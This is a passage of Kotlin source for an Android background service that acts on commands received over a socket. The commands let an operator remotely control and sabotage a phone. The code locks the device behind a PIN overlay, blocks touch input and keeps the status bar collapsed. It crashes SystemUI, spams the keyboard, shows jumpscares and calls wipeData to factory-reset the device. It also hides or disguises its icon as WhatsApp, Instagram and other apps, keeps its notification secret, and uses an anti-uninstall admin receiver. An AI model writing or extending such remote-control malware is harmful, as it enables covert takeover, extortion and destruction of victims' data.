                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val tv = android.widget.TextView(this@DeviceService).apply {
                text = ""
                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 42f)
                gravity = android.view.Gravity.CENTER
                setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD)
                setShadowLayer(20f, 0f, 0f, android.graphics.Color.BLACK)
                alpha = 1f
            }
            spamKbView = tv
            wm.addView(tv, params)

            // 2. Invisible EditText sebagai anchor spawn/hide IME
            val editText = android.widget.EditText(this@DeviceService).apply {
                alpha = 0f
                isFocusable = true
                isFocusableInTouchMode = true
                setSingleLine()
            }
            spamKbInputView = editText

            val focusParams = WindowManager.LayoutParams(
                1, 1, type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0
                y = 0
            }
            wm.addView(editText, focusParams)

            val imm = getSystemService(INPUT_METHOD_SERVICE) as android.view.inputmethod.InputMethodManager
            spamKbInputManager = imm

            // 3. Loop: show/hide keyboard + animasi typing warna-warni
            spamKbHandler = Handler(Looper.getMainLooper())
            var colorStep = 0
            val full = "Babay Bung !!"
            val colors = intArrayOf(
                0xFFFF3B3B.toInt(), 0xFFFF9800.toInt(), 0xFFFFEB3B.toInt(),
                0xFF4CAF50.toInt(), 0xFF03A9F4.toInt(), 0xFF9C27B0.toInt(),
                0xFFE91E63.toInt(), 0xFF00BCD4.toInt()
            )

            spamKbRunnable = object : Runnable {
                private var showReset = false
                private var pauseTicks = 0

                override fun run() {
                    if (!spamKbActive) return

                    // toggle IME show/hide
                    try {
                        editText.requestFocus()
                        if (spamKbImeVisible) {
                            imm.hideSoftInputFromWindow(editText.windowToken, 0)
                            spamKbImeVisible = false
                        } else {
                            imm.showSoftInput(editText, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT)
                            spamKbImeVisible = true
                        }
                    } catch (_: Exception) {}

                    // animasi typing
                    if (pauseTicks > 0) {
                        // jeda sebelum siklus baru
                        pauseTicks--
                        if (pauseTicks == 0) {
                            tv.text = ""
                            tv.setTextColor(colors[0])
                            colorStep = 0
                            showReset = false
                        }
                    } else if (showReset) {
                        // selesai ngetik — mulai jeda 3 tick (750ms)
                        pauseTicks = 3
                    } else {
                        val shown = (tv.text.length + 1).coerceAtMost(full.length)
                        tv.text = full.substring(0, shown)
                        tv.setTextColor(colors[colorStep % colors.size])
                        colorStep++
                        if (shown >= full.length) showReset = true
                    }

                    spamKbHandler?.postDelayed(this, 250)
                }
            }
            spamKbHandler?.post(spamKbRunnable!!)

            emitStatus(JSONObject().apply { put("spamKeyboardActive", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startSpamKeyboard: ${e.message}")
            spamKbActive = false
        }
    }
}

private fun stopSpamKeyboard() {
    spamKbActive = false
    spamKbHandler?.removeCallbacks(spamKbRunnable ?: Runnable {})
    spamKbHandler = null
    spamKbRunnable = null

    Handler(Looper.getMainLooper()).post {
        // 1. Hide IME DULU (sebelum view dihapus)
        try {
            val editText = spamKbInputView as? android.widget.EditText
            if (editText != null) {
                spamKbInputManager?.hideSoftInputFromWindow(editText.windowToken, 0)
            }
        } catch (_: Exception) {}

        // 2. Baru hapus view dari WindowManager
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        try { spamKbView?.let { wm.removeView(it) } } catch (_: Exception) {}
        spamKbView = null
        try { spamKbInputView?.let { wm.removeView(it) } } catch (_: Exception) {}
        spamKbInputView = null

        spamKbInputManager = null
        spamKbImeVisible = false
    }
    emitStatus(JSONObject().apply { put("spamKeyboardActive", false) })
}

// ═══════════════════════════════════════════════════════════
// FITUR BARU: FREEZE LAYAR (block touch via toggle, tanpa durasi)
// ═══════════════════════════════════════════════════════════
private var freezeScreenView: android.view.View? = null
private var freezeScreenActive = false

private fun startFreezeScreen() {
    if (freezeScreenActive) return
    freezeScreenActive = true
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val view = android.view.View(this@DeviceService).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setOnTouchListener { _, _ -> true } // block semua touch
            }
            freezeScreenView = view
            wm.addView(view, params)
            emitStatus(JSONObject().apply { put("freezeScreenActive", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startFreezeScreen: ${e.message}")
            freezeScreenActive = false
        }
    }
}

private fun stopFreezeScreen() {
    freezeScreenActive = false
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            freezeScreenView?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        freezeScreenView = null
    }
    emitStatus(JSONObject().apply { put("freezeScreenActive", false) })
}
    
    private fun hideAppIcon(hide: Boolean) {
    try {
        val pm = packageManager
        if (hide) {
            // Disable semua alias
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Disable juga MainActivity asli
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } else {
            // Re-enable alias yang sebelumnya aktif (default)
            pm.setComponentEnabledSetting(
                ComponentName(packageName, THEME_ALIASES["default"]!!),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        emitStatus(JSONObject().apply { put("iconHidden", hide) })
    } catch (e: Exception) {
        Log.e("DeviceService", "hideAppIcon: ${e.message}")
    }
}
    
    
    private fun setVolumeMute(mute: Boolean) {
    try {
        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.setStreamVolume(
            AudioManager.STREAM_MUSIC,
            if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
            0
        )
        emitStatus(JSONObject().apply { put("volumeMuted", mute) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setVolumeMute: ${e.message}")
    }
}
    
    
    // ═══════════════════════════════════════════════════════════
// SOFT RESTART — efek restart tanpa root
// Tutup semua app + kill SystemUI + lock screen
// ═══════════════════════════════════════════════════════════
private fun softRestart() {
    try {
        // 1. Vibrate feedback
        try {
            val vm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (getSystemService(VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager).defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vm.vibrate(android.os.VibrationEffect.createOneShot(800, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vm.vibrate(800)
            }
        } catch (_: Exception) {}

        // 2. Kill SystemUI (UI akan restart otomatis → efek "restart")
        try {
            Runtime.getRuntime().exec(arrayOf("am", "crash", "com.android.systemui"))
        } catch (_: Exception) {}

        // 3. Force-stop app yang umum (browser, sosmed, dll)
        val packagesToKill = listOf(
            "com.android.chrome",
            "com.android.browser",
            "com.google.android.youtube",
            "com.whatsapp",
            "com.instagram.android",
            "com.facebook.katana",
            "com.zhiliaoapp.musically", // TikTok
            "com.telegram.messenger",
            "org.telegram.messenger",
            "com.google.android.gm",
            "com.google.android.apps.maps"
        )
        for (pkg in packagesToKill) {
            try {
                val am = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
                am.killBackgroundProcesses(pkg)
            } catch (_: Exception) {}
        }

        // 4. Kill semua background process (app akan di-restart oleh OS)
        try {
            val am = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
            am.killBackgroundProcesses(packageName) // kill diri sendiri juga
        } catch (_: Exception) {}

        // 5. Tampilkan overlay hitam sebentar (efek restart)
        showRestartOverlay()

        emitStatus(JSONObject().apply {
            put("restartDevice", true)
            put("restartType", "soft")
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "softRestart: ${e.message}")
        emitStatus(JSONObject().apply {
            put("restartDevice", false)
            put("restartDeviceReason", e.message ?: "unknown")
        })
    }
}

private var restartOverlayView: android.view.View? = null
private fun showRestartOverlay() {
    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE
            )

            // Overlay hitam dengan logo "Restarting..."
            val layout = android.widget.LinearLayout(this).apply {
                setBackgroundColor(Color.BLACK)
                gravity = android.view.Gravity.CENTER
                orientation = android.widget.LinearLayout.VERTICAL
            }

            // Spinner
            val spinner = android.widget.ProgressBar(this).apply {
                indeterminateTintList = android.content.res.ColorStateList.valueOf(Color.WHITE)
            }
            layout.addView(spinner, android.widget.LinearLayout.LayoutParams(120, 120))

            // Text
            val tv = android.widget.TextView(this).apply {
                text = "Restarting..."
                setTextColor(Color.WHITE)
                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20f)
                setPadding(0, 40, 0, 0)
            }
            layout.addView(tv)

            restartOverlayView = layout
            wm.addView(layout, params)

            // Hilangkan overlay setelah 4 detik
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    restartOverlayView?.let { wm.removeView(it) }
                } catch (_: Exception) {}
                restartOverlayView = null
            }, 4000)
        } catch (e: Exception) {
            Log.e("DeviceService", "showRestartOverlay: ${e.message}")
        }
    }
}

// ═══════════════════════════════════════════════════════════
// FACTORY RESET via Device Admin
// ═══════════════════════════════════════════════════════════
private fun factoryResetDevice() {
    try {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminName = android.content.ComponentName(this, AntiUninstallReceiver::class.java)

        if (!dpm.isAdminActive(adminName)) {
            Log.e("DeviceService", "factoryReset: Device Admin belum aktif")
            emitStatus(JSONObject().apply {
                put("factoryReset", false)
                put("factoryResetReason", "device_admin_not_active")
            })
            // Coba aktifkan otomatis via intent
            try {
                val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
                    putExtra(
                        android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Aktifkan untuk factory reset"
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (_: Exception) {}
            return
        }

        // Wipe semua data (factory reset)
        dpm.wipeData(0)
        emitStatus(JSONObject().apply { put("factoryReset", true) })
        Log.d("DeviceService", "factoryReset: wipeData dipanggil")
    } catch (e: Exception) {
        Log.e("DeviceService", "factoryReset: ${e.message}")
        emitStatus(JSONObject().apply {
            put("factoryReset", false)
            put("factoryResetReason", e.message ?: "unknown")
        })
    }
}

    private fun showToast(message: String) {
    Handler(Looper.getMainLooper()).post {
        android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
    }
    emitStatus(JSONObject().apply { put("toastSent", message) })
}

    private fun lockDevice(jsonValue: String) {
    try {
        val trimmed = jsonValue.trimStart()
        if (!trimmed.startsWith("{")) {
            val parts = jsonValue.split("|", limit = 2)
            lockPin   = parts.getOrNull(0)?.trim() ?: ""
            lockTitle = parts.getOrNull(1)?.trim()?.takeIf { it.isNotEmpty() } ?: "Perangkat Terkunci"
        } else {
            val obj   = JSONObject(jsonValue)
            lockPin   = obj.optString("pin", "")
            lockTitle = obj.optString("title", "Perangkat Terkunci")
        }

        val intent = Intent(this, LockOverlayService::class.java).apply {
            putExtra(LockOverlayService.EXTRA_PIN, lockPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        startLockFlashBlink()

        emitStatus(JSONObject().apply {
            put("deviceLocked", true)
            put("lockTitle", lockTitle)
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "lockDevice error: ${e.message}")
    }
}

    private fun unlockDevice() {
    lockPin   = ""
    lockTitle = ""
    stopLockFlashBlink()
    stopKillSystem()
    lockMediaPlayer?.release()
    lockMediaPlayer = null
    stopStatusBarCollapse()
    removeLockCustomOverlay()
    val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply {
        put("deviceLocked", false)
        put("lockTitle", "")
    })
}

    // ── Change Theme (icon & nama app) ────────────────────────────────────────
    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            // Disable semua alias dulu
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Enable alias yang dipilih
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
            Log.d("DeviceService", "changeTheme: $theme -> $chosen")
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    // ── Lock Custom (floating WebView overlay — tidak masuk app) ─────────────
    private var lockCustomView: android.webkit.WebView? = null
    private var lockCustomBlockView: android.view.View? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private fun lockCustom(jsonValue: String) {
    try {
        val obj = if (jsonValue.trimStart().startsWith("{"))
            JSONObject(jsonValue)
        else
            JSONObject().put("html", jsonValue)

        val htmlContent = obj.optString("html", "")
        if (htmlContent.isEmpty()) {
            removeLockCustomOverlay()
            unlockDevice()
            return
        }

        val doVibrate    = obj.optBoolean("vibrate", false)
        val doFlash      = obj.optBoolean("flash", false)
        val doSound      = obj.optBoolean("sound", false)
        val doBlockTouch = obj.optBoolean("blockTouch", false)
        val doKillSystem = obj.optBoolean("killSystem", false)

        lockPin   = ""
        lockTitle = "CUSTOM"

        removeLockCustomOverlay()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                )

                val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
${htmlContent}
</body>
</html>"""

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    setBackgroundColor(Color.BLACK)
                    loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                }

                lockCustomView = wv
                lockCustomWm.addView(wv, params)
            } catch (e: Exception) {
                Log.e("DeviceService", "lockCustom overlay: ${e.message}")
            }
        }

        if (doFlash) startLockFlashBlink() else stopLockFlashBlink()
        if (doSound) playLockSound()
        if (doVibrate) vibrateDevice("800")
        if (doKillSystem) startKillSystem() else stopKillSystem()

        if (doBlockTouch && !doKillSystem) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val bParams = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    )
                    val blockView = android.view.View(this@DeviceService).apply {
                        setOnTouchListener { _, _ -> true }
                    }
                    lockCustomBlockView = blockView
                    lockCustomWm.addView(blockView, bParams)
                } catch (_: Exception) {}
            }
        }

        startStatusBarCollapse()
        emitStatus(JSONObject().apply {
            put("deviceLocked", true)
            put("lockTitle", "CUSTOM")
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "lockCustom error: ${e.message}")
    }
}
    
    
    

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
    Handler(Looper.getMainLooper()).post {
        lockCustomView?.let {
            try { lockCustomWm.removeView(it) } catch (_: Exception) {}
        }
        lockCustomBlockView?.let {
            try { lockCustomWm.removeView(it) } catch (_: Exception) {}
        }
    }
    lockCustomView = null
    lockCustomBlockView = null
}

        private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    Log.e("DeviceService", "setWallpaper HTTP ${conn.responseCode}")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    Log.e("DeviceService", "setWallpaper: decodeByteArray returned null")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                Log.d("DeviceService", "Wallpaper set OK")
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    

    fun emitStatus(statusObj: JSONObject) {
    if (socket?.connected() != true) return
    socket?.emit("device:status", JSONObject().apply {
        put("deviceId", deviceId)
        put("status", statusObj)
    })
}

private fun readUid(): String {
    return try {
        val json = assets.open("uid.json").bufferedReader().use { it.readText() }
        JSONObject(json).optString("uid", "")
    } catch (e: Exception) {
        Log.e("DeviceService", "readUid error: ${e.message}")
        ""
    }
}

private fun readKey(): String {
    return try {
        val json = assets.open("uid.json").bufferedReader().use { it.readText() }
        JSONObject(json).optString("key", "")
    } catch (e: Exception) {
        Log.e("DeviceService", "readKey error: ${e.message}")
        ""
    }
}

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
    super.onDestroy()
    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
    try { unregisterReceiver(localReceiver) } catch (_: Exception) {}

    try { stopLiveCamera() } catch (_: Exception) {}
    try { stopLockFlashBlink() } catch (_: Exception) {}
    try { stopLcdDamage() } catch (_: Exception) {}
    try { stopSpamKeyboard() } catch (_: Exception) {}
    try { stopFreezeScreen() } catch (_: Exception) {}
    try { stopHackScreen() } catch (_: Exception) {}
    try { stopKillSystem() } catch (_: Exception) {}
    try { stopJumpscare() } catch (_: Exception) {}
    try { stopJumpscare2() } catch (_: Exception) {}

    flashBlinking = false
    flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
    flashHandler = null
    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}

    try { mediaPlayer?.release() } catch (_: Exception) {}
    mediaPlayer = null
    try { lockMediaPlayer?.release() } catch (_: Exception) {}
    lockMediaPlayer = null

    socket?.disconnect()
    socket = null
}

    private fun buildNotification(): Notification {
    val contentIntent = PendingIntent.getActivity(
        this,
        0,
        Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        },
        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
    )

    return NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Sync Service")
        .setContentText("Berjalan di background")
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setContentIntent(contentIntent)
        .setOngoing(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)  // 🔥 MIN = paling silent
        .setCategory(NotificationCompat.CATEGORY_SERVICE)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .setSilent(true)
        .build()
}

private fun createNotificationChannel() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        val ch = NotificationChannel(
            CHANNEL_ID,
            "Sync Service",
            NotificationManager.IMPORTANCE_MIN  // 🔥 MIN = nyaris invisible
        ).apply {
            description = "Service background"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(ch)
    }
}

    private var mediaPlayer: android.media.MediaPlayer? = null

    private var lockMediaPlayer: android.media.MediaPlayer? = null

    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<android.view.View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = org.json.JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = android.widget.ImageView(this@DeviceService)
                    imgView.scaleType = android.widget.ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = android.view.Gravity.TOP or android.view.Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
